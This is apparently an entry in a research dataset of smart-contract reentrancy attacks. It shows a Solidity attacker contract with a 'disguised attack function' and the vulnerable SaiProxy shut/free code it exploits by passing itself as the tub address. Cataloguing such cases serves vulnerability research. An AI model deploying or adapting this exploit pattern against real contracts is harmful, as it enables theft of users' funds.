# Attack12

### Contract Name:
SaiProxyCreateAndExecute(test1314.sol)
SaiProxy(test1314.sol)
SaiProxyCreateAndExecute(test1314.sol)
SaiProxy(test1314.sol)
### Contract Address:



### Transaction Count:



### Involved Ethers:



### Length of the Call Chain: 

2 internal function 1 external function

### Victim Function:

`shut(address,bytes32,address)`

### Attack Mechanism:

Attack code:

```javascript
contract TubInterface {
    SaiProxyCreateAndExecute s = new SaiProxyCreateAndExecute();
    constructor() payable {}
    bytes32 b;
    function shut() public {   // Disguised attack function
        //victim.call.value(1 eth)(bytes4(keccak256("contribution(uint256)")), 10);
        s.shut(this, b, this);
    }
    function() payable {
      
    }
    function getvalue() returns (uint) {
        return this.balance;
    }
}

```

Attacked code:

```javascript
contract SaiProxyCreateAndExecute {
    ...
    function shut(address tub_, bytes32 cup, address otc_) public {
        TubInterface tub = TubInterface(tub_);
        wipeAndFree(tub_, cup, rmul(tub.ink(cup), tub.per()), tub.tab(cup), otc_);
        tub.shut(cup);
    }

    function wipeAndFree(address tub_, bytes32 cup, uint jam, uint wad, address otc_) public payable {
        wipe(tub_, cup, wad, otc_);
        free(tub_, cup, jam);
    }


    function free(address tub_, bytes32 cup, uint jam) public {
        if (jam > 0) {
            TubInterface tub = TubInterface(tub_);
            uint ink = rdiv(jam, tub.per());
            ink = rmul(ink, tub.per()) <= jam ? ink : ink - 1;
            tub.free(cup, ink);
            if (tub.skr().allowance(this, tub) != uint(-1)) {
                tub.skr().approve(tub, uint(-1));
            }
            tub.exit(ink);
            uint freeJam = tub.gem().balanceOf(this); // Withdraw possible previous stuck WETH as well
            tub.gem().withdraw(freeJam);
            address(msg.sender).transfer(freeJam);
        }
    }

    ...
}
```

In this case, the goal of our reentrancy is `tub.shut(cup);` in the victim code. because `tub` is tainted by `tub_`.`wipeAndFree(tub_, cup, rmul(tub.ink(cup), tub.per()), tub.tab(cup), otc_);` function calling `free` function which contains money.
**Attack.** The attacker call `shut()` function to make `tub` is attacker's address.